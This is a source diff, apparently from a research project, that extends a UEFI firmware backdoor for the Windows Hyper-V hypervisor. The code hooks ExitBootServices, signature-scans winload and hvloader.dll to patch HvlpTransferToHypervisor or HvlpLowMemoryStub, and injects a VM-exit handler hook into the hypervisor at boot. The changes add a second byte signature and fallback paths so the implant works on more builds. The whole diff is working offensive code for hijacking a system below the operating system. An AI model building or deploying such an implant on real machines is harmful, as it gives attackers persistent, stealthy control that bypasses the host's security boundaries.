@@ -50,6 +50,7 @@
 #include "debug.h"
 #include "loader.h"
 #include "ovmf.h"
+#include "std.h"
 #include "DmaBackdoorHv.h"
 #include "asm/common_asm.h"
 
@@ -203,8 +204,6 @@ VOID *BackdoorImageRealocate(VOID *Image)
 #define VM_EXIT_HANDLER_OLD  0xb00
 #define VM_EXIT_HANDLER_CODE 0xb40
 
-#define VM_EXIT_HOOK_SIZE 13
-
 #define VM_F_EPT_COLLECT 0x01
 
 typedef struct _VM_EXIT_INFO
@@ -309,8 +308,7 @@ VOID VMExitHandler(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4)
         {
             // return VM exit handler information            
             *Arg1 = Info->VmExitCounter;
-            *Arg0 = *(UINT64 *)(Below1MbPage + VM_EXIT_HANDLER_OLD + VM_EXIT_HOOK_SIZE + 2) - \
-                                VM_EXIT_HOOK_SIZE;
+            *Arg0 = (UINT64)Below1MbPage;
 
             Status = EFI_SUCCESS;
         }
@@ -410,6 +408,10 @@ VOID VMExitHandler(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4)
 
 VOID *VMExitHandler_end(VOID) { return (VOID *)&VMExitHandler; }
 
+#define HV_SIGN_NOT_MATCHED  0
+#define HV_SIGN_MATCHED_1    1
+#define HV_SIGN_MATCHED_2    2
+
 VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLowMemoryStub)
 {
     // this value will be patched by PatchBelow1MbPageAddr()
@@ -425,7 +427,7 @@ VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLo
 
     while (p < 0x10000)
     {
-        UINT8 *Func = (UINT8 *)HvEntry + p, m = 0;          
+        UINT8 *Func = (UINT8 *)HvEntry + p, Matched = HV_SIGN_NOT_MATCHED;   
 
         __writecr3(HvPageTable);
 
@@ -445,46 +447,65 @@ VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLo
 
                 ...
 
+                .text:FFFFF8000023A19F      mov     rdx, [rsp+arg_28]
                 .text:FFFFF8000023A1A4      call    _vmentry_handle
         */
-        m = *(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
+        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
             *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
             *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
             *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
-            *(Func + 0x86) == 0xe8;
+            *(Func + 0x86) == 0xe8)
+        {
+            Matched = HV_SIGN_MATCHED_1;
+        }
+        else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
+                 *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
+                 *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
+                 *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
+                 *(Func + 0xd7) == 0xe8)
+        {
+            Matched = HV_SIGN_MATCHED_2;   
+        }
 
         __writecr3(PageTable);
 
-        if (m)
+        if (Matched != HV_SIGN_NOT_MATCHED)
         {
-            UINT8 *Buff = Below1MbPage + VM_EXIT_HANDLER_OLD;
+            UINT8 *Buff = Below1MbPage + VM_EXIT_HANDLER_OLD;   
+            UINT32 HookSize = 0;    
 
             __writecr3(HvPageTable);
 
-            // get calee address
-            Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
+            if (Matched == HV_SIGN_MATCHED_1)
+            {
+                // 1-st signature was matched
+                Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
+                HookSize = 13;
+            }
+            else if (Matched == HV_SIGN_MATCHED_2)
+            {
+                // 2-nd signature was matched
+                Func = (UINT8 *)JUMP32_ADDR(Func + 0xd7);
+                HookSize = 16;
+            }
 
             __writecr3(PageTable);
 
             Info->HvVmExit = (UINT64)Func;
 
-            /*
-                Set up hook on hvix64.sys VM exit handler
-            */
-
             __writecr3(HvPageTable);
 
             // save original bytes of VM exit handler
-            __movsb(Buff, Func, VM_EXIT_HOOK_SIZE);
+            __movsb(Buff, Func, HookSize);
 
             __writecr3(PageTable);
 
             // mov rax, addr
-            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE) = 0xb848;
-            *(UINT64 *)(Buff + VM_EXIT_HOOK_SIZE + 2) = (UINT64)(Func + VM_EXIT_HOOK_SIZE);
+            *(UINT16 *)(Buff + HookSize) = 0xb848;
+            *(UINT64 *)(Buff + HookSize + 2) = (UINT64)(Func + HookSize);
 
             // jmp rax ; from callgate to function
-            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE + 10) = 0xe0ff;
+            *(UINT16 *)(Buff + HookSize + 10) = 0xe0ff;
 
             __writecr3(HvPageTable);
 
@@ -508,8 +529,118 @@ VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLo
 
 VOID *new_HvlpTransferToHypervisor_end(VOID) { return (VOID *)&new_HvlpTransferToHypervisor; } 
 //--------------------------------------------------------------------------------------
+VOID *FindLoadedImageInRange(char *ImageName, VOID *Addr, UINTN Len)
+{
+    UINTN p = 0;
+
+    while (p < Len - PAGE_SIZE)
+    {
+        UINT8 *Image = (UINT8 *)Addr + p;
+        EFI_IMAGE_DOS_HEADER *DosHeader = (EFI_IMAGE_DOS_HEADER *)Image;
+
+        // check for PE image header signature
+        if (*(UINT16 *)Image == EFI_IMAGE_DOS_SIGNATURE && DosHeader->e_lfanew >= sizeof(EFI_IMAGE_DOS_HEADER))
+        {     
+            EFI_IMAGE_NT_HEADERS *Header = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Image, DosHeader->e_lfanew);
+
+            // check for legit header
+            if (Header->Signature == EFI_IMAGE_NT_SIGNATURE)
+            {
+                char *ExportName = NULL;
+                UINT32 ExportAddr = Header->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+                #define VALID_RVA(_v_) ((_v_) > PAGE_SIZE && (_v_) < Header->OptionalHeader.SizeOfImage)
+
+                if (VALID_RVA(ExportAddr))
+                {                    
+                    EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
+
+                    // sanity check
+                    if (Export->Characteristics == 0 && Export->MajorVersion == 0 && Export->MinorVersion == 0 &&
+                        (Export->AddressOfNames == 0 || VALID_RVA(Export->AddressOfNames)) &&
+                        (Export->AddressOfFunctions == 0 || VALID_RVA(Export->AddressOfFunctions)) && 
+                        (Export->AddressOfNameOrdinals == 0 || VALID_RVA(Export->AddressOfNameOrdinals)))
+                    {
+                        // get export name for this image
+                        if (VALID_RVA(Export->Name))
+                        {
+                            ExportName = (char *)RVATOVA(Image, Export->Name);
+                        }
+                    }
+                }
+
+                if (ExportName && std_strcmp(ExportName, ImageName) == 0)
+                {
+                    return Image;
+                }
+            }            
+        }
+
+        p += PAGE_SIZE;
+    }
+
+    return NULL;
+}
+
+VOID *FindLoadedImage(char *ImageName)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+    EFI_MEMORY_DESCRIPTOR *MapList = NULL;
+    UINTN MapSize = 0, MapKey = 0, DescriptorSize = 0;
+    UINT32 DescriptorVersion = 0;
+
+    // get memory map size
+    Status = m_BS->GetMemoryMap(&MapSize, NULL, &MapKey, &DescriptorSize, &DescriptorVersion);
+    if (Status != EFI_BUFFER_TOO_SMALL)
+    {
+        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
+        return NULL;
+    }
+
+    DbgMsg(__FILE__, __LINE__, "EFI_MEMORY_DESCRIPTOR version is 0x%x\r\n", DescriptorVersion);    
+
+    // allocate memory map buffer
+    Status = m_BS->AllocatePool(EfiBootServicesData, MapSize, (VOID **)&MapList);
+    if (Status != EFI_SUCCESS)
+    {
+        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
+        return NULL;
+    }
+
+    // get memory map
+    Status = m_BS->GetMemoryMap(&MapSize, MapList, &MapKey, &DescriptorSize, &DescriptorVersion);
+    if (Status == EFI_SUCCESS)
+    {
+        UINTN i = 0;
+        EFI_MEMORY_DESCRIPTOR *MapEntry = MapList;
+
+        for (i = 0; i < MapSize / DescriptorSize; i += 1)
+        {            
+            UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
+            VOID *Image = NULL;
+
+            // find PE images loaded by bootloader
+            if ((Image = FindLoadedImageInRange(ImageName, (VOID *)MapEntry->PhysicalStart, Len)) != NULL)
+            {
+                // image was found
+                return Image;
+            }
+
+            // go to the next entry
+            MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
+        }
+    }
+    else
+    {
+        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
+    }
+
+    m_BS->FreePool((VOID *)MapList);
+
+    return NULL;
+}
+//--------------------------------------------------------------------------------------
 #define WINLOAD_HOOK_SIZE JUMP32_LEN
-#define WINLOAD_HOOK_BUFF WINLOAD_HOOK_SIZE * 2
 
 // original address of hooked function
 EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
@@ -536,15 +667,88 @@ void PatchBelow1MbPageAddr(UINT8 *Buff, UINTN BuffSize, VOID *Value)
     }
 }
 
+UINT8 *FindHvlpTransferToHypervisor(VOID *Addr, UINTN Len)
+{
+    UINTN i = 0;
+
+    for (i = 0; i < Len; i += 1) 
+    {
+        UINT8 *Func = RVATOVA(Addr, i);
+
+        /*
+            Match winload!HvlpTransferToHypervisor() code signature:
+
+                .text:0000000140109270      push    rbx
+                .text:0000000140109272      push    rbp
+                .text:0000000140109273      push    rsi
+                .text:0000000140109274      push    rdi
+                .text:0000000140109275      push    r12
+                .text:0000000140109277      push    r13
+                .text:0000000140109279      push    r14
+                .text:000000014010927B      push    r15
+                .text:000000014010927D      mov     cs:HvlpSavedRsp, rsp
+                .text:0000000140109284      jmp     r8
+
+        */
+        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x53 && /* push rbx */
+            *(Func + 0x02) == 0x55 && *(Func + 0x03) == 0x56 && /* push rbp && push rsi */
+            *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x25 && /* mov HvlpSavedRsp, rsp */
+            *(Func + 0x14) == 0x41 && *(Func + 0x15) == 0xff && *(Func + 0x16) == 0xe0) /* jmp r8 */
+            
+        {
+            return Func;         
+        }
+    }
+
+    return NULL;
+}
+
+UINT8 *FindHvlpLowMemoryStub(VOID *Addr, UINTN Len)
+{
+    UINTN i = 0;
+
+    for (i = 0; i < Len; i += 1) 
+    {
+        UINT8 *Func = RVATOVA(Addr, i);
+
+        /*
+            Match winload!HvlpLowMemoryStub() code signature:
+
+                .text:0000000140109260      mov     cr3, rcx
+                .text:0000000140109263      jmp     rdx
+
+        */
+        if (*(Func + 0x00) == 0x0f && *(Func + 0x01) == 0x22 && *(Func + 0x02) == 0xd9 && /* mov cr3, rcx */
+            *(Func + 0x03) == 0xff && *(Func + 0x04) == 0xe2) /* jmp rdx */
+        {
+            return Func;         
+        }
+    }
+
+    return NULL;
+}
+
 EFI_STATUS EFIAPI new_ExitBootServices(
     EFI_HANDLE ImageHandle,
     UINTN Key)
 {    
-    UINTN i = 0;
+    UINT32 DescriptorVersion = 0;
+    UINTN i = 0, MapSize = 0, DescriptorSize = 0;    
     EFI_IMAGE_NT_HEADERS *pHeaders = NULL;    
+    EFI_STATUS Status = EFI_SUCCESS;
 
     VOID **HvlpBelow1MbPage = NULL;
     UINT8 *HvlpBelow1MbPageAllocated = NULL;    
+
+#ifdef USE_TRANSFER_TO_HYPERVISOR_HOOK
+
+    UINT8 *HvlpTransferToHypervisor = NULL;                                 
+
+#else
+
+    UINT8 *HvlpLowMemoryStub = NULL;
+
+#endif
 
     HV_INFO *HvInfo = (HV_INFO *)HV_INFO_ADDR;
 
@@ -566,7 +770,7 @@ EFI_STATUS EFIAPI new_ExitBootServices(
 
     if (Base == NULL)
     {
-        HvInfo->Success = (UINT64)-1;
+        HvInfo->Success = BACKDOOR_ERR_WINLOAD;
         goto _end;
     }    
 
@@ -594,20 +798,42 @@ EFI_STATUS EFIAPI new_ExitBootServices(
         {
             // get mov instructions operands
             HvlpBelow1MbPage = (VOID **)((UINTN)(Code + 0x11) + *(INT32 *)(Code + 0x0d));
-            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x06) + *(INT32 *)(Code + 0x02));            
+            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x06) + *(INT32 *)(Code + 0x02));
+            break;
+        }
+
+        /*
+            Match winload!VlpPropagateHvlReturnData() code signature:
+
+                .text:00000001800192B4      mov     rax, [rdx+28h]
+                .text:00000001800192B8      mov     cs:HvlpBelow1MbPage, rax
+                .text:00000001800192BF      mov     al, [rdx+30h]
+                .text:00000001800192C2      add     rdx, 38h
+                .text:00000001800192C6      mov     cs:HvlpBelow1MbPageAllocated, al
+                .text:00000001800192CC      call    HvlpAddOnDebugBootOptions
+        */
+        else if (*(UINT32 *)Code == 0x28428b48 && /* mov rax, [rdx+28h] */
+                 *(Code + 0x04) == 0x48 && *(Code + 0x05) == 0x89 && *(Code + 0x06) == 0x05 && /* mov HvlpBelow1MbPage, rax */
+                 *(Code + 0x0e) == 0x48 && *(Code + 0x0f) == 0x83 && *(Code + 0x10) == 0xc2 && *(Code + 0x11) == 0x38 && /* add rdx, 38h */
+                 *(Code + 0x12) == 0x88 && *(Code + 0x13) == 0x05 && /* mov HvlpBelow1MbPageAllocated, al */            
+                 *(Code + 0x18) == 0xe8) /* call HvlpAddOnDebugBootOptions */
+        {
+            // get mov instructions operands
+            HvlpBelow1MbPage = (VOID **)((UINTN)(Code + 0x0b) + *(INT32 *)(Code + 0x07));
+            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x18) + *(INT32 *)(Code + 0x14));
             break;
         }
     }
 
     if (HvlpBelow1MbPage == NULL || HvlpBelow1MbPageAllocated == NULL)
     {
-        HvInfo->Success = (UINT64)-2;
+        HvInfo->Success = BACKDOOR_ERR_BELOW_1MB_NOT_FOUND;
         goto _end;
     }
 
     if (*HvlpBelow1MbPageAllocated == 0)
     {
-        HvInfo->Success = (UINT64)-3;
+        HvInfo->Success = BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED;
         goto _end;
     }
 
@@ -625,112 +851,201 @@ EFI_STATUS EFIAPI new_ExitBootServices(
         HvlpBelow1MbPageAllocated, *HvlpBelow1MbPageAllocated
     );    
 
-    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
+#ifdef USE_TRANSFER_TO_HYPERVISOR_HOOK
+
+    /*
+        Patch winload!HvlpTransferToHypervisor() to gain execution during hypervisor load
+    */
+
+    // find winload!HvlpTransferToHypervisor()
+    if (HvlpTransferToHypervisor = FindHvlpTransferToHypervisor(Base, pHeaders->OptionalHeader.SizeOfImage))
     {
-        UINT8 *Func = RVATOVA(Base, i);
+        UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
+        UINTN CodeSize = 0;
 
-        /*
-            Match winload!HvlpTransferToHypervisor() code signature:
+        // use HvlpBelow1MbPage + 0x10 to store hook handler code
+        UINT8 *Buff = Below1MbPage + 0x10;
+        UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + (JUMP32_LEN * 2) + 16;
 
-                .text:0000000140109270      push    rbx
-                .text:0000000140109272      push    rbp
-                .text:0000000140109273      push    rsi
-                .text:0000000140109274      push    rdi
-                .text:0000000140109275      push    r12
-                .text:0000000140109277      push    r13
-                .text:0000000140109279      push    r14
-                .text:000000014010927B      push    r15
-                .text:000000014010927D      mov     cs:HvlpSavedRsp, rsp
-                .text:0000000140109284      jmp     r8
+        UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
+        VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
+        
+        DbgMsg(__FILE__, __LINE__, "winload!HvlpTransferToHypervisor is at "FPTR"\r\n", HvlpTransferToHypervisor);
 
-        */
-        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x53 && /* push rbx */
-            *(Func + 0x02) == 0x55 && *(Func + 0x03) == 0x56 && /* push rbp && push rsi */
-            *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x25 && /* mov HvlpSavedRsp, rsp */
-            *(Func + 0x14) == 0x41 && *(Func + 0x15) == 0xff && *(Func + 0x16) == 0xe0) /* jmp r8 */
-            
-        {
-            UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
-            UINTN CodeSize = 0;
+        CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;
 
-            // use HvlpBelow1MbPage + 0x10 to store hook handler code
-            UINT8 *Buff = Below1MbPage + 0x10;
-            UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + (JUMP32_LEN * 2) + 16;
+        // copy VM exit handler code to HvlpBelow1MbPage
+        m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);
 
-            UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
-            VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
-            
-            DbgMsg(__FILE__, __LINE__, "winload!HvlpTransferToHypervisor is at "FPTR"\r\n", Func);
+        // patch HvlpBelow1MbPage value in VMExitHandler() code
+        PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);
 
-            CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;
+        // clear VM exit handler info
+        VmExitInfo->Flags = 0;
+        VmExitInfo->VmExitCounter = 0;
 
-            // copy VM exit handler code to HvlpBelow1MbPage
-            m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);
+        m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);
 
-            // patch HvlpBelow1MbPage value in VMExitHandler() code
-            PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);
+        // get new_HvlpTransferToHypervisor() code size
+        CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;
 
-            // clear VM exit handler info
-            VmExitInfo->Flags = 0;
-            VmExitInfo->VmExitCounter = 0;
+        // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
+        m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);
 
-            m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);
+        // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
+        PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);
 
-            /*
-                Set up hook on winload!HvlpTransferToHypervisor()
-            */
+        // push rcx / push rdx / push r8
+        *(UINT32 *)Buff = 0x50415251;
 
-            CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;
+        // push rbx / push rdi / push rsi
+        *(UINT32 *)(Buff + 4) = 0x90565753;
 
-            // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
-            m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);
+        // call new_HvlpTransferToHypervisor
+        *(Buff + 8) = 0xe8;
+        *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);
 
-            // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
-            PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);
+        // pop rsi / pop rdi / pop rbx
+        *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;
 
-            // push rcx / push rdx / push r8
-            *(UINT32 *)Buff = 0x50415251;
+        // pop r8 / pop rdx / pop rcx
+        *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;
 
-            // push rbx / push rdi / push rsi
-            *(UINT32 *)(Buff + 4) = 0x90565753;
+        // save original bytes
+        m_BS->CopyMem(Buff + JUMP32_LEN + 16, HvlpTransferToHypervisor, WINLOAD_HOOK_SIZE);
 
-            // call addr ; from callgate to handler            
-            *(Buff + 8) = 0xe8;
-            *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);
+        // jmp addr ; from callgate to function
+        *(UINT8 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE) = 0xe9;
+        *(UINT32 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE + 1) = \
+            JUMP32_OP(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE, HvlpTransferToHypervisor + WINLOAD_HOOK_SIZE);
 
-            // pop rsi / pop rdi / pop rbx
-            *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;
+        // jmp HvlpBelow1MbPage + 0x10
+        *HvlpTransferToHypervisor = 0xe9;
+        *(UINT32 *)(HvlpTransferToHypervisor + 1) = JUMP32_OP(HvlpTransferToHypervisor, Buff);            
 
-            // pop r8 / pop rdx / pop rcx
-            *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;
+        DbgMsg(
+            __FILE__, __LINE__, 
+            "winload!HvlpTransferToHypervisor() hook was set (handler = "FPTR")\r\n",
+            Buff
+        );
 
-            // save original bytes
-            m_BS->CopyMem(Buff + JUMP32_LEN + 16, Func, WINLOAD_HOOK_SIZE);
-
-            // jmp addr ; from callgate to function
-            *(UINT8 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE) = 0xe9;
-            *(UINT32 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE + 1) = \
-                JUMP32_OP(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE, Func + WINLOAD_HOOK_SIZE);
-
-            // jmp addr ; from function to callgate
-            *Func = 0xe9;
-            *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff);            
-
-            DbgMsg(
-                __FILE__, __LINE__, 
-                "winload!HvlpTransferToHypervisor() hook was set (handler = "FPTR")\r\n",
-                Buff
-            );
-
-            goto _end;
-        }
+        goto _end;
     }
 
     DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpTransferToHypervisor()\r\n");
 
-    HvInfo->Success = (UINT64)-4;
+    HvInfo->Success = BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR;
+
+#else // USE_TRANSFER_TO_HYPERVISOR_HOOK
+
+    /*
+        Patch winload!HvlpLowMemoryStub() or hvloader!HvlpLowMemoryStub() to gain execution during hypervisor load
+    */
+
+    // find winload!HvlpLowMemoryStub()
+    if ((HvlpLowMemoryStub = FindHvlpLowMemoryStub(Base, pHeaders->OptionalHeader.SizeOfImage)) == NULL)
+    {
+        VOID *HvLoader = FindLoadedImage("hvloader.dll");
+        if (HvLoader)
+        {
+            pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(HvLoader, ((EFI_IMAGE_DOS_HEADER *)HvLoader)->e_lfanew);
+
+            DbgMsg(__FILE__, __LINE__, "hvloader.dll is at "FPTR"\r\n", HvLoader);    
+
+            // find hvloader!HvlpLowMemoryStub()
+            HvlpLowMemoryStub = FindHvlpLowMemoryStub(HvLoader, pHeaders->OptionalHeader.SizeOfImage);
+        }
+        else
+        {
+            DbgMsg(__FILE__, __LINE__, "Unable to locate hvloader.dll\r\n");       
+        }
+    }
+
+    if (HvlpLowMemoryStub)
+    {
+        UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
+        UINTN CodeSize = 0;
+
+        // use HvlpBelow1MbPage + 0x10 to store hook handler code
+        UINT8 *Buff = Below1MbPage + 0x10;
+        UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + JUMP32_LEN + 21;
+
+        UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
+        VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
+        
+        DbgMsg(__FILE__, __LINE__, "winload!HvlpLowMemoryStub is at "FPTR"\r\n", HvlpLowMemoryStub);
+
+        CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;
+
+        // copy VM exit handler code to HvlpBelow1MbPage
+        m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);
+
+        // patch HvlpBelow1MbPage value in VMExitHandler() code
+        PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);
+
+        // clear VM exit handler info
+        VmExitInfo->Flags = 0;
+        VmExitInfo->VmExitCounter = 0;
+
+        m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);
+
+        // get new_HvlpTransferToHypervisor() code size
+        CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;
+
+        // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
+        m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);
+
+        // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
+        PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);
+
+        // push rcx / push rdx / push r8
+        *(UINT32 *)Buff = 0x50415251;
+
+        // push rbx / push rdi / push rsi
+        *(UINT32 *)(Buff + 4) = 0x90565753;
+
+        // call new_HvlpTransferToHypervisor
+        *(Buff + 8) = 0xe8;
+        *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);
+
+        // pop rsi / pop rdi / pop rbx
+        *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;
+
+        // pop r8 / pop rdx / pop rcx
+        *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;
+
+        // mov cr3, rcx
+        *(UINT32 *)(Buff + JUMP32_LEN + 16) = 0xd9220f90;
+
+        // jmp rdx
+        *(UINT16 *)(Buff + JUMP32_LEN + 20) = 0xe2ff;
+
+        // jmp $ + 0x10
+        *HvlpLowMemoryStub = 0xe9;
+        *(UINT32 *)(HvlpLowMemoryStub + 1) = JUMP32_OP(Below1MbPage, Buff);            
+
+        DbgMsg(
+            __FILE__, __LINE__, 
+            "winload!HvlpLowMemoryStub() hook was set (handler = "FPTR")\r\n",
+            Buff
+        );
+
+        goto _end;
+    }
+
+    DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpLowMemoryStub()\r\n");
+
+    HvInfo->Success = BACKDOOR_ERR_LOW_MEMORY_STUB;
+
+#endif // USE_TRANSFER_TO_HYPERVISOR_HOOK
 
 _end:
+
+    Status = m_BS->GetMemoryMap(&MapSize, NULL, &Key, &DescriptorSize, &DescriptorVersion);
+    if (Status != EFI_BUFFER_TOO_SMALL)
+    {
+        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
+    }
 
     // exit to the original function
     return old_ExitBootServices(ImageHandle, Key);
